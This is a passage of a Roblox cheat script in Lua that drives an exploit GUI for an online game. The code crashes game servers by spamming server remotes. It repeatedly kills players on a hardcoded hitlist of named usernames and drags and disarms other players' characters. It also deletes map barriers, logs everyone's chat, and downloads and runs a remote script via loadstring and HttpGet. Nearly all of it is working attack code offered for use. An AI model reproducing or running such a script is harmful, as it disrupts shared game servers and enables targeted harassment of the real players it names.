					game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
	
					cam.CameraType = Enum.CameraType.Fixed
					cam.Focus = CFrame.new(Vector3.new(0, -9e6, 0))
	
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-9e6,9e6,-9e6)
					wait(0.2)
					game.Players.LocalPlayer.Character.Torso.Anchored = true
					game.CoreGui.RobloxGui:Remove()
					game.Players.LocalPlayer.PlayerGui.LBBGui.DragFrame:Remove()
	
					repeat
						game:GetService("ReplicatedStorage").SpawnLuckyBlock:FireServer()
						game:GetService("RunService").RenderStepped:wait()
					until game.Players.LocalPlayer.Backpack:FindFirstChild("HalloweenBowAndArrow")
	
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = "The Server will crash in 1 minute and 30 Seconds";
						Color = Color3.fromRGB(94,176,0);
						Font = Enum.Font.SourceSansBold;
						FontSize = Enum.FontSize.Size96;
					})
	
					for i = 1, 5020 do
						game:GetService("RunService").RenderStepped:wait()
						game.Players.LocalPlayer.Character.Head.Transparency = 0
						game.Players.LocalPlayer.Backpack:FindFirstChild("HalloweenBowAndArrow").Parent = game.Players.LocalPlayer.Character
						hum:UnequipTools()
					end
					game.Players.LocalPlayer.Backpack:FindFirstChild("HalloweenBowAndArrow").Parent = game.Players.LocalPlayer.Character
	
					game.Players.LocalPlayer.Character.HalloweenBowAndArrow.Handle.Mesh:Remove()
					game.Players.LocalPlayer.Character.HalloweenBowAndArrow.PumpkinHead.Mesh:Remove()
					game.Players.LocalPlayer.Character.HalloweenBowAndArrow.PumpkinHead:BreakJoints()
					game.Players.LocalPlayer.Character.HalloweenBowAndArrow.PumpkinHead.Position = Vector3.new(-9e6,9e6,-9e6)
					game.Players.LocalPlayer.Character.Head.Transparency = 0
	
					while Timer > Crash  do
						game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("In " .. (Timer) .. " hi ha ha", "All")
						Timer = Timer - 5
						wait(5)
					end
					wait(3)
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = "Server Crashed";
						Color = Color3.fromRGB(176,0,0);
						Font = Enum.Font.SourceSansBold;
						FontSize = Enum.FontSize.Size96;
					})
				end)
	
				--ToVoid
				ToVoid.MouseButton1Down:connect(function()
					game.Players.LocalPlayer.Character.Torso.Anchored = false
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1040100, -1000400, -100290)
					wait(0.1)
					game.Players.LocalPlayer.Character.Torso.Anchored = true
				end)
				ToVoid.MouseButton1Down:connect(function()
					ToVoid.Visible = false
					UnToVoid.Visible = true
				end)
	
				--untovoid
				UnToVoid.MouseButton1Down:connect(function()
					game.Players.LocalPlayer.Character.Torso.Anchored = false
				end)
				UnToVoid.MouseButton1Down:connect(function()
					UnToVoid.Visible = false
					ToVoid.Visible = true
				end)
	
				--InsertTarget
				LockTarget.MouseButton1Down:connect(function()
					table.insert(Targets, Target)
					for i, val in pairs(Targets) do
						print(val)
					end
				end)
	
				--RemoveTarget
				RemoveTarget.MouseButton1Down:connect(function()
					local thingy = table.find(Targets, Target)
					table.remove(Targets, thingy)
					for i, val in pairs(Targets) do
						print(val)
					end
				end)
	
				--KillHits
				KillHits.MouseButton1Down:connect(function()
					_G.KillHits = true
	
					while _G.KillHits do
						game:GetService("RunService").RenderStepped:wait()
						pcall(function()
							for i,hit in pairs(game.Players:GetChildren()) do
								if table.find(Hitlist, hit.Name) then
									if hit.Character.Humanoid.Health >= 1 then
										game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),hit.Character.Torso.Position)
									end
								end
							end
						end)
					end
				end)
				KillHits.MouseButton1Down:connect(function()
					KillHits.Visible = false
					UnKillHits.Visible = true
				end)
	
				--unkillhits
				UnKillHits.MouseButton1Down:connect(function()
					_G.KillHits = false
				end)
				UnKillHits.MouseButton1Down:connect(function()
					UnKillHits.Visible = false
					KillHits.Visible = true
				end)
	
				--anticrash
				AntiCrash.MouseButton1Down:connect(function()
					_G.AntiCrash = true
					local CrashGear = {"DragonCompanion", "SillyGuitar", "Ferdinand", "BabyNessieMount", "Wasp", "SharkMount", "RamMount", "WhiteGoldBlueFlowerSword", "SpaceSword", "FestiveMooseMount", "ElkMount", "HalloweenBowAndArrow", "PinataMount"}
					for i,v in pairs(game.Players:GetChildren()) do
						for i,gear in pairs(CrashGear) do
							if v.Backpack:FindFirstChild(gear) then
								game.StarterGui:SetCore("ChatMakeSystemMessage", {
									Text = v.Name .. " Has A Crash Gear";
									Color = Color3.fromRGB(0,0,0);
									Font = Enum.Font.SourceSansBold;
									FontSize = Enum.FontSize.Size96;
								})
								while _G.AntiCrash do
									game:GetService("RunService").RenderStepped:wait()
									pcall(function()
										for i,v in pairs(game.Players:GetChildren()) do
											for i,gear in pairs(CrashGear) do
												if v.Backpack:FindFirstChild(gear) then
													print "2"
													if v.Backpack:FindFirstChild(gear) then
														if game.Players:FindFirstChild(v.Name) then
															if game.Players:FindFirstChild(v.Name).Character.Humanoid.Health >= 1 then
																game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Players:FindFirstChild(v.Name).Character.Torso.Position)
															end
														end
													end
												end
											end
										end
									end)
								end
							end
						end
					end
				end)
				AntiCrash.MouseButton1Down:connect(function()
					AntiCrash.Visible = false
					UnAntiCrash.Visible = true
				end)
	
				--unanticrash
				UnAntiCrash.MouseButton1Down:connect(function()
					_G.AntiCrash = false
				end)
				UnAntiCrash.MouseButton1Down:connect(function()
					UnAntiCrash.Visible = false
					AntiCrash.Visible = true
				end)
	
				--Characterremove
				CharacterRemove.MouseButton1Down:connect(function()
					local Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
					table.insert(previous, Position)
					_G.RemoveMe = true
					while _G.RemoveMe == true do
						game:GetService("RunService").RenderStepped:wait()
						game.Players.LocalPlayer.Character:Remove()
					end
				end)
	
				CharacterRemove.MouseButton1Down:connect(function()
					UnCharacterRemove.Visible = true
					CharacterRemove.Visible = false
				end)
	
				--UnCharacterremove
				UnCharacterRemove.MouseButton1Down:connect(function()
					_G.RemoveMe = false
					game:GetService("ReplicatedStorage").Remotes.SetRigType:FireServer(Enum.HumanoidRigType.R6)
					wait(0.5)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(previous[1])
					table.remove(previous, 1)
				end)
				UnCharacterRemove.MouseButton1Down:connect(function()
					UnCharacterRemove.Visible = false
					CharacterRemove.Visible = true
				end)
	
				--KrnlCbring
				KrnlCbring.MouseButton1Down:connect(function()
					_G.TorsoCbring = true
					while _G.TorsoCbring do
						game.RunService.RenderStepped:wait()
						for i,v in pairs(game.Players:GetChildren()) do
							for i,value in pairs(Targets) do
								if v.Name == value and v ~= game.Players.LocalPlayer and v.Name ~= "Zanonner" and v.Name ~= "BubbaGumpWasTaken" then
									for i,val in pairs(v.Character:GetChildren()) do
										if val:IsA("BasePart") then
											val.Anchored = true
											val.CFrame = game.Players.LocalPlayer.Character.Torso.CFrame * CFrame.new(Vector3.new(1.5, 1, -1.8))
										elseif val:IsA("Tool") then
											val:Remove()
										end
									end
								end
							end
						end
					end
				end)
				KrnlCbring.MouseButton1Down:connect(function()
					KrnlCbring.Visible = false
					UnKrnlCbring.Visible = true
				end)
	
				--UnKrnlCbring
				UnKrnlCbring.MouseButton1Down:connect(function()
					_G.TorsoCbring = false
				end)
				UnKrnlCbring.MouseButton1Down:connect(function()
					UnKrnlCbring.Visible = false
					KrnlCbring.Visible = true
				end)
	
				--Hitlist
				Hitlist = {"SenkoVx", "UnidentifiedGlitcher", "kingdinoreal2", "kingdinoreal3", "kaydopepin76", "HoIIow_Dreams", "Orangeabilityy", "New_Gen3", "New_Gen2", "New_Gen4", "Shhreekk", "othersIlIIlllIlIlIIl", "bielsamorim1", "bielsamorim2", "MrMediocree", "Vencizlav", "Ryan09791", "TheBIoodG0D", "MyxCauazin7", "CharlesPham1234", "kurrisu_kun"}
	
			end
			coroutine.wrap(CNJMHJX_fake_script)()
		end
	
		for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
			if v.Name == "LBBGui" then
				v:Remove()
			end
		end
		if getgenv().Enabled then
			Gui2()
		else
			Gui()
			getgenv().Enabled = true
		end
	end)
	
	--AW
	AW.MouseButton1Down:connect(function()
		_G.AntiWater = true
		while _G.AntiWater do
			game.RunService.RenderStepped:wait()
			for i,v in pairs(game.Workspace:GetDescendants()) do
				if v.Name == "WaterKill" then
					v:Remove()
				end
			end
		end
	end)
	AW.MouseButton1Down:connect(function()
		UNAW.Visible = true
		AW.Visible = false
	end)
	
	--BTP
	BTP.MouseButton1Down:connect(function()
		local function BaseTp()
			local hum = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
			for i = 1, 5 do
				game.RunService.RenderStepped:wait()
				hum:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("GlossyRPG "))
				hum:UnequipTools()
				hum:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("GlossyRPG "))
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			wait()
			hum:UnequipTools()
			game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
			wait(0.1)
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
		end
		game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessedEvent)
			if (input.KeyCode == Enum.KeyCode.B and game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl)) or (input.KeyCode == Enum.KeyCode.LeftControl and game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.B)) then
				BaseTp()
			end
		end)
	end)
	
	--RBW
	RBW.MouseButton1Down:connect(function()
		_G.RemoveBarriers = true
		while _G.RemoveBarriers do
			game.RunService.RenderStepped:wait()
			for i,v in pairs(game.Workspace:GetDescendants()) do
				if v.Name == "Fence" or v.Name == "FF" then
					v:Remove()
				end
			end
		end
	end)
	RBW.MouseButton1Down:connect(function()
		UNRBW.Visible = true
		RBW.Visible = false
	end)
	
	--RP
	RP.MouseButton1Down:connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end)
	RP.MouseButton1Down:connect(function()
		UNRP.Visible = true
		RP.Visible = false
	end)
	
	--CH
	CH.MouseButton1Down:connect(function()
		-- Made by RlawL --
	
		local ps = game:GetService("Players")
		local rs = game:GetService("RunService")
		local rst = game:GetService("ReplicatedStorage")
	
		local me = ps.LocalPlayer
		local myBackpack = me:WaitForChild("Backpack")
		local myScreenGui = me:WaitForChild("PlayerGui")
	
		local gearIds = {68539623, 535104095, 65469908, 63253718, 83704165, 169602103}
		local gearNames = {"KorbloxSwordAndShield", "NeonNinjaSword", "SkullCracker", "SkullMace", "Icedagger"}
		local selectedGear = "KorbloxSwordAndShield"
	
		local quickSelectGearIds = {139577901, 1074738432, 93136746, 209980135, 93725362, 236442380}
		local quickSelectGearNames = {"FestivePeriastron", "GiganticBatWings", "TelamonsterTheChaosEdge", "NinjaSmokeBomb", "Sword of the Behemoth", "GearRecycler"}
	
		local on = false
		local killOnJoin = false
		local killOnJoinList = {}
		local offset = Vector3.new(1.5, 1, -1.8)
	
		for i,v in pairs(gearIds) do
			rst.Remotes.ToggleAsset:InvokeServer(gearIds[i])
		end
	
		----------------------------------------------------------------
		local mainGui = Instance.new("ScreenGui")
		mainGui.Name = "Kill Gui"
		mainGui.ResetOnSpawn = true
		mainGui.Parent = myScreenGui
	
		local mainFrame = Instance.new("Frame")
		mainFrame.Name = "Main Frame"
		mainFrame.AnchorPoint = Vector2.new(.5, .5)
		mainFrame.BackgroundTransparency = .3
		mainFrame.BorderSizePixel = 0
		mainFrame.Position = UDim2.new(.5, 0, .8, 0)
		mainFrame.Size = UDim2.new(.5, 0, 0, 100)
		mainFrame.Parent = mainGui
	
		local playerListFrame = Instance.new("Frame")
		playerListFrame.Name = "Players"
		playerListFrame.AnchorPoint = Vector2.new(0, .5)
		playerListFrame.BackgroundTransparency = 1
		playerListFrame.Position = UDim2.new(0, 0, .25, 0)
		playerListFrame.Size = UDim2.new(.8, 0, .5, 0)
		playerListFrame.Parent = mainFrame
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.FillDirection = Enum.FillDirection.Horizontal
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
		uiListLayout.Parent = playerListFrame
	
		local weaponOptionsFrame = Instance.new("Frame")
		weaponOptionsFrame.Name = "Weapon Options"
		weaponOptionsFrame.AnchorPoint = Vector2.new(0, .5)
		weaponOptionsFrame.BackgroundTransparency = 1
		weaponOptionsFrame.Position = UDim2.new(0, 0, .75, 0)
		weaponOptionsFrame.Size = UDim2.new(.8, 0, .5, 0)
		weaponOptionsFrame.Parent = mainFrame
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.FillDirection = Enum.FillDirection.Horizontal
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
		uiListLayout.Parent = weaponOptionsFrame
	
		local quickGearsFrame = weaponOptionsFrame:Clone()
		quickGearsFrame.Name = "Quick Gears Frame"
		quickGearsFrame.BackgroundTransparency = 0.5
		quickGearsFrame.AnchorPoint = Vector2.new(0, 1)
		quickGearsFrame.Position = UDim2.new(0, 0, 1.3, 0)
		quickGearsFrame.Size = UDim2.new(1, 0, .3, 0)
		quickGearsFrame.Parent = mainFrame
	
		local settingsFrame = Instance.new("Frame")
		settingsFrame.Name = "Settings"
		settingsFrame.AnchorPoint = Vector2.new(1, .5)
		settingsFrame.BackgroundTransparency = 1
		settingsFrame.Position = UDim2.new(1, 0, .5, 0)
		settingsFrame.Size = UDim2.new(.2, 0, 1, 0)
		settingsFrame.Parent = mainFrame
		local teleportButton = Instance.new("TextButton")
		teleportButton.Name = "Teleport"
		teleportButton.BackgroundTransparency = .5
		teleportButton.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
		teleportButton.Position = UDim2.new(0, 0, .5, 0)
		teleportButton.Size = UDim2.new(.333, 0, .5, 0)
		teleportButton.BorderSizePixel = 0
		teleportButton.Font = Enum.Font.Gotham
		teleportButton.TextScaled = true
		teleportButton.Text = "X Teleport X"
		teleportButton.Parent = settingsFrame
		local cleanButton = teleportButton:Clone()
		cleanButton.Text = "Clean"
		cleanButton.Name = "Clean"
		cleanButton.BackgroundColor3 = Color3.fromRGB(255, 85, 127)
		cleanButton.Position = UDim2.new(.333, 0, .5, 0)
		cleanButton.Parent = settingsFrame
		local onButton = teleportButton:Clone()
		onButton.Text = "On"
		onButton.Name = "On"
		onButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
		onButton.Position = UDim2.new(0, 0, 0, 0)
		onButton.Parent = settingsFrame
		local offButton = teleportButton:Clone()
		offButton.Text = "Off"
		offButton.Name = "Off"
		offButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
		offButton.Position = UDim2.new(.333, 0, 0, 0)
		offButton.Parent = settingsFrame
		local unblindButton = teleportButton:Clone()
		unblindButton.Text = "Unblind"
		unblindButton.Name = "Unblind"
		unblindButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
		unblindButton.Position = UDim2.new(0.666, 0, 0.5, 0)
		unblindButton.Parent = settingsFrame
		local killOnJoinButton = teleportButton:Clone()
		killOnJoinButton.Text = "Kill OFF Join"
		killOnJoinButton.Name = "Kill On Join"
		killOnJoinButton.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
		killOnJoinButton.Position = UDim2.new(0.666, 0, 0, 0)
		killOnJoinButton.Parent = settingsFrame
	
		local playerListButton = Instance.new("TextButton")
		playerListButton.BackgroundTransparency = .5
		playerListButton.Size = UDim2.new(.111, 0, 1, 0)
		playerListButton.TextScaled = true
		playerListButton.Font = Enum.Font.GothamBold
		local playerListEnabled = Instance.new("BoolValue")
		playerListEnabled.Name = "Enabled"
		playerListEnabled.Parent = playerListButton
	
		local weaponOptionButton = Instance.new("TextButton")
		weaponOptionButton.BackgroundTransparency = .5
		weaponOptionButton.BackgroundColor3 = Color3.fromRGB()
		weaponOptionButton.TextScaled = true
		weaponOptionButton.Font = Enum.Font.GothamBlack
	
		for i = 1,#gearNames do
			local weaponButton = weaponOptionButton:Clone()
			weaponButton.Name = gearNames[i]
			weaponButton.Text = gearNames[i]
			weaponButton.Size = UDim2.new(1/#gearNames, 0, 1, 0)
			weaponButton.Parent = weaponOptionsFrame
	
			weaponButton.Activated:Connect(function()
				selectedGear = gearNames[i]
				weaponButton.BackgroundColor3 = Color3.fromRGB(1, 74, 0)
				for i,v in pairs(weaponOptionsFrame:GetChildren()) do
					if v:IsA("TextButton") and v ~= weaponButton then
						v.BackgroundColor3 = Color3.fromRGB()
					end
				end
			end)
		end
		weaponOptionsFrame["KorbloxSwordAndShield"].BackgroundColor3 = Color3.fromRGB(1, 74, 0)
	
		for i = 1,#quickSelectGearNames do
			local quickWeaponButton = weaponOptionButton:Clone()
			quickWeaponButton.Name = quickSelectGearNames[i]
			quickWeaponButton.Text = quickSelectGearNames[i]
			quickWeaponButton.Size = UDim2.new(1/#quickSelectGearNames, 0, 1, 0)
			quickWeaponButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
			quickWeaponButton.Parent = quickGearsFrame
	
			quickWeaponButton.Activated:Connect(function()
				if not (myBackpack:FindFirstChild(quickSelectGearNames[i]) or workspace[me.Name]:FindFirstChild(quickSelectGearNames[i])) then
					rst.Remotes.ToggleAsset:InvokeServer(quickSelectGearIds[i])
				else
					for e = 1,2 do
						rst.Remotes.ToggleAsset:InvokeServer(quickSelectGearIds[i])
					end
				end
			end)
		end
	
		----------------------------------------------------------------
	
		local platform = Instance.new("Part")
		platform.Name = "Platform"
		platform.Anchored = true
		platform.Size = Vector3.new(50, 3, 50)
		platform.Transparency = .3
		platform.Position = Vector3.new(11111,511105,11111)
		platform.Parent = workspace
	
		----------------------------------------------------------------
	
		function updatePlayerButtonSize()
			local numberOfPlayers = (#ps:GetPlayers())-1
	
			for i,v in pairs(playerListFrame:GetChildren()) do
				if v:IsA("TextButton") then
					v.Size = UDim2.new(1/numberOfPlayers, 0, 1, 0)
				end
			end
		end
	
		ps.PlayerAdded:Connect(function(plr)
			local name = plr.Name
	
			local playerButton = playerListButton:Clone()
			playerButton.Name = name
			playerButton.Text = name
			playerButton.Parent = playerListFrame
	
			updatePlayerButtonSize()
	
			local num = math.random(135, 255)
			playerButton.BackgroundColor3 = Color3.fromRGB(num, num, num)
	
			local enabled = playerButton.Enabled
			if killOnJoin == true then
				enabled.Value = true
				playerButton.BackgroundColor3 = Color3.fromRGB(85, 255, 0)
			end
			for i,v in pairs(killOnJoinList) do
				if name == v then
					enabled.Value = true
					playerButton.BackgroundColor3 = Color3.fromRGB(85, 255, 0)
					break
				end
			end
	
			playerButton.Activated:Connect(function()
				if enabled.Value == false then
					enabled.Value = true
					table.insert(killOnJoinList, name)
					playerButton.BackgroundColor3 = Color3.fromRGB(85, 255, 0)
				else
					enabled.Value = false
					for i = 1,#killOnJoinList do
						if name == killOnJoinList[i] then
							table.remove(killOnJoinList, i)
							break
						end
					end
					playerButton.BackgroundColor3 = Color3.fromRGB(num, num, num)
				end
			end)
	
		end)
	
		ps.PlayerRemoving:Connect(function(plr)
			local name = plr.Name
	
			for i,v in pairs(playerListFrame:GetChildren()) do
				if v.Name == tostring(name) then
					v:Destroy()
				end
			end
	
			updatePlayerButtonSize()
		end)
	
		local numberOfPlayers = (#ps:GetPlayers())-1
		for i,v in pairs(ps:GetPlayers()) do
			if v ~= me then
				local name = v.Name
	
				local playerButton = playerListButton:Clone()
				playerButton.Name = name
				playerButton.Text = name
				playerButton.Size = UDim2.new(1/numberOfPlayers, 0, 1, 0)
				playerButton.Parent = playerListFrame
				local enabled = playerButton.Enabled
	
				local num = math.random(135, 255)
				playerButton.BackgroundColor3 = Color3.fromRGB(num, num, num)
	
				playerButton.Activated:Connect(function()
					if enabled.Value == false then
						enabled.Value = true
						table.insert(killOnJoinList, name)
						playerButton.BackgroundColor3 = Color3.fromRGB(85, 255, 0)
					else
						enabled.Value = false
						for i = 1,#killOnJoinList do
							if name == killOnJoinList[i] then
								table.remove(killOnJoinList, i)
								break
							end
						end
						playerButton.BackgroundColor3 = Color3.fromRGB(num, num, num)
					end
				end)
			end
		end
	
		----------------------------------------------------------------
	
		teleportButton.Activated:Connect(function()
			local myChar = me.Character or me.CharacterAdded:Wait()
	
			if teleportButton.Text == "X Teleport X" then
				teleportButton.Text = "V Teleport V"
	
				repeat
					pcall(function()
						rs.RenderStepped:Wait()
						myChar:SetPrimaryPartCFrame(CFrame.new(11111,511111,11111))
					end)
				until teleportButton.Text == "X Teleport X"
			else
				teleportButton.Text = "X Teleport X"
			end
		end)
	
		function clean()
			for i,v in pairs(workspace:GetChildren()) do
				local hum = v:FindFirstChild("Humanoid")
				if hum and hum.Parent.Name ~= me.Name then
					if hum.Health <= 0 then
						v:Destroy()
					else
						for i,bodyPart in pairs(hum.Parent:GetChildren()) do
							if bodyPart:IsA("BasePart") then
								bodyPart.Anchored = false
							end
						end
					end
				end
			end
		end
	
		cleanButton.Activated:Connect(function()
			clean()
		end)
	
		onButton.Activated:Connect(function()
			on = true
		end)
	
		offButton.Activated:Connect(function()
			on = false
		end)
	
		killOnJoinButton.Activated:Connect(function()
			if killOnJoin == false then
				killOnJoin = true
				killOnJoinButton.Text = "Kill ON Join"
			else
				killOnJoin = false
				killOnJoinButton.Text = "Kill OFF Join"
			end
		end)
	
		unblindButton.Activated:Connect(function()
			for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
				if v.Name == "ScreenGui" or v.Name == "DarknessGui" then
					v:Destroy()
				end
			end
		end)
	
		----------------------------------------------------------------
	
		while true do
			wait()
			if on == true then
				local suc, er = pcall(function()
					local myBackpack = me.Backpack
					local playersNamesToAttack = {}
					local myTorso = me.Character:FindFirstChild("Torso") or me.Character:FindFirstChild("UpperTorso")
					local myHumanoid = me.Character:FindFirstChild("Humanoid")
	
					for i,button in pairs(playerListFrame:GetChildren()) do
						for i,enabled in pairs(button:GetChildren()) do
							if enabled and enabled.Value == true then
								table.insert(playersNamesToAttack, button.Name)
							end
						end
					end
					if myHumanoid and myHumanoid.Health > 0 then
						for i,plr in pairs(ps:GetPlayers()) do
							for i,targetName in pairs(playersNamesToAttack) do
								if plr.Name == targetName then
									local targetPlayer = plr
									local targetCharacter = plr.Character
	
									if targetCharacter and targetCharacter.Parent ~= nil then
										for i,v in pairs(targetCharacter:GetChildren()) do
											if v:IsA("Tool") then
												v:Destroy()
											elseif v:IsA("BasePart") then
												v.Anchored = true
												v.CFrame = myTorso.CFrame * CFrame.new(offset)
											end
										end
									end
	
									break
								end
							end
						end
					end
	
					if myHumanoid then
						if myHumanoid.Health > 0 then
							local tool = myBackpack:FindFirstChild(selectedGear)
							if tool then
								tool.Parent = myTorso.Parent
							end
						else
							clean()
							local rocketJumper = myBackpack:FindFirstChild("RocketJumper") or myHumanoid.Parent:FindFirstChild("RocketJumper")
							if rocketJumper then
								rocketJumper.Parent = myHumanoid.Parent
								for i,plr in pairs(ps:GetPlayers()) do
									for i,targetName in pairs(playersNamesToAttack) do
										if plr.Name == targetName then
											local targetPlayer = plr
											local targetCharacter = plr.Character
	
											if targetCharacter and targetCharacter.Parent ~= nil then
												local targetCharacterTorso = targetCharacter:FindFirstChild("Torso") or targetCharacter:FindFirstChild("UpperTorso")
												if targetCharacterTorso then
													local args = {targetCharacterTorso.Position, Vector3.new(targetCharacterTorso.Position.X+.1, targetCharacterTorso.Position.Y+.1, targetCharacterTorso.Position.Z+.1)}
													rocketJumper.FireRocket:FireServer(unpack(args))
												end
											end
										end
									end
								end
							end
						end
					end
	
				end)
				if not suc then print("Error: ", er) end
			end
			if (not mainGui) or mainGui.Parent == nil then break end
		end
	end)
	
	--VB
	VB.MouseButton1Down:connect(function()
		_G.Visible = true
		while _G.Visible do
			game.RunService.RenderStepped:wait()
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name == "FF" then
					v.Transparency = 0.25
					v.Color = BrickColor.new("Lime green").Color
				end
			end
		end
	end)
	VB.MouseButton1Down:connect(function()
		UNVB.Visible = true
		VB.Visible = false
	end)
	
	--CL
	CL.MouseButton1Down:connect(function()
		-- Version: 2.82
		-- Instances:
		local ChatGui = Instance.new("ScreenGui")
		local Frame = Instance.new("Frame")
		local LogPanel = Instance.new("ScrollingFrame")
		local Close = Instance.new("TextButton")
		local Mini = Instance.new("TextButton")
		local Log = Instance.new("TextButton")
		local title = Instance.new("TextLabel")
		--Properties:
		ChatGui.Name = "ChatGui"
		ChatGui.Parent = game.Players.LocalPlayer.PlayerGui
		ChatGui.ResetOnSpawn = false
	
		Frame.Parent = ChatGui
		Frame.BackgroundColor3 = Color3.new(0, 0, 0)
		Frame.BorderSizePixel = 0
		Frame.Position = UDim2.new(0.0278396439, 0, 0.565217376, 0)
		Frame.Size = UDim2.new(0, 392, 0, 25)
		Frame.Active = true
		Frame.Draggable = true
	
		LogPanel.Name = "LogPanel"
		LogPanel.Parent = Frame
		LogPanel.BackgroundColor3 = Color3.new(0, 0, 0)
		LogPanel.BorderColor3 = Color3.new(0.223529, 0.223529, 0.223529)
		LogPanel.Position = UDim2.new(-0.000221580267, 0, 0.968695641, 0)
		LogPanel.Size = UDim2.new(0, 392, 0, 203)
		LogPanel.ScrollBarThickness = 5
		LogPanel.ScrollingEnabled = true
		LogPanel.CanvasSize=UDim2.new(2,0,100,0)
	
		Close.Name = "Close"
		Close.Parent = Frame
		Close.BackgroundColor3 = Color3.new(1, 1, 1)
		Close.BackgroundTransparency = 1
		Close.Position = UDim2.new(0.823979557, 0, 0.0399999991, 0)
		Close.Size = UDim2.new(0, 69, 0, 24)
		Close.Font = Enum.Font.SourceSans
		Close.Text = "Close"
		Close.TextColor3 = Color3.new(1, 1, 1)
		Close.TextSize = 14
	
		Mini.Name = "Mini"
		Mini.Parent = Frame
		Mini.BackgroundColor3 = Color3.new(1, 1, 1)
		Mini.BackgroundTransparency = 1
		Mini.Position = UDim2.new(0.647959173, 0, 0, 0)
		Mini.Size = UDim2.new(0, 69, 0, 24)
		Mini.Font = Enum.Font.SourceSans
		Mini.Text = "Minimize"
		Mini.TextColor3 = Color3.new(1, 1, 1)
		Mini.TextSize = 14
	
		Log.Name = "Log"
		Log.Parent = Frame
		Log.BackgroundColor3 = Color3.new(1, 1, 1)
		Log.BackgroundTransparency = 1
		Log.Position = UDim2.new(0.293367326, 0, 0, 0)
		Log.Size = UDim2.new(0, 69, 0, 24)
		Log.Font = Enum.Font.SourceSans
		Log.Text = "Log Chat [ON]"
		Log.TextColor3 = Color3.new(1, 1, 1)
		Log.TextSize = 14
	
		title.Name = "title"
		title.Parent = Frame
		title.BackgroundColor3 = Color3.new(1, 1, 1)
		title.BackgroundTransparency = 1
		title.Size = UDim2.new(0, 115, 0, 24)
		title.Font = Enum.Font.SourceSans
		title.Text = "Chat GUI"
		title.TextColor3 = Color3.new(1, 1, 1)
		title.TextSize = 14
		title.TextXAlignment = Enum.TextXAlignment.Left
		-- Scripts:
		local logging = true
		local minimized = false
		Log.MouseButton1Down:Connect(function()
			logging = not logging
			if logging then Log.Text = "Log Chat [ON]" else Log.Text = "Log Chat [OFF]" end
		end)
		Mini.MouseButton1Down:Connect(function()
			if minimized then
				LogPanel:TweenSize(UDim2.new(0, 392, 0, 203), "InOut", "Sine", 0.5, false, nil)
			else
				LogPanel:TweenSize(UDim2.new(0, 392, 0, 0), "InOut", "Sine", 0.5, false, nil)
			end
			minimized = not minimized
		end)
		Close.MouseButton1Down:Connect(function()
			ChatGui:Destroy()
		end)
	
		local prevOutputPos = 0
		function output(plr, msg)
			if not logging then return end
			local colour = Color3.fromRGB(255,255,255)
	
			if string.sub(msg, 1,1) == ":" or string.sub(msg,1,1) == ";" then colour = Color3.fromRGB(255,0,0) elseif string.sub(msg,1,2) == "/w" or string.sub(msg,1,7) == "/whisper" or string.sub(msg,1,5) == "/team" or string.sub(msg,1,2) == "/t" then colour = Color3.fromRGB(0,0,255) else colour = Color3.fromRGB(255,255,255) end
	
			local o = Instance.new("TextLabel",LogPanel)
			o.Text = plr.Name .. ": " .. msg
			o.Size = UDim2.new(0.5,0,.006,0)
			o.Position = UDim2.new(0,0,.007 + prevOutputPos ,0)
			o.Font = Enum.Font.SourceSansSemibold
			o.TextColor3 = colour
			o.TextStrokeTransparency = 0
			o.BackgroundTransparency = 0
			o.BackgroundColor3 = Color3.new(0,0,0)
			o.BorderSizePixel = 0
			o.BorderColor3 = Color3.new(0,0,0)
			o.FontSize = "Size14"
			o.TextXAlignment = Enum.TextXAlignment.Left
			o.ClipsDescendants = true
			prevOutputPos = prevOutputPos + 0.007
		end
	
		for i,v in pairs(game.Players:GetChildren()) do
			v.Chatted:Connect(function(msg)
				output(v, msg)
			end)
		end
	
		game.Players.ChildAdded:Connect(function(plr)
			if plr:IsA("Player") then
				plr.Chatted:Connect(function(msg)
					output(plr, msg)
				end)
			end
		end)
	end)
	
	--UNAV
	UNAV.MouseButton1Down:connect(function()
		_G.AntiVoid = false
	end)
	UNAV.MouseButton1Down:connect(function()
		AV.Visible = true
		UNAV.Visible = false
	end)
	
	--UNAW
	UNAW.MouseButton1Down:connect(function()
		_G.AntiWater = false
	end)
	UNAW.MouseButton1Down:connect(function()
		AW.Visible = true
		UNAW.Visible = false
	end)
	
	--UNRBW
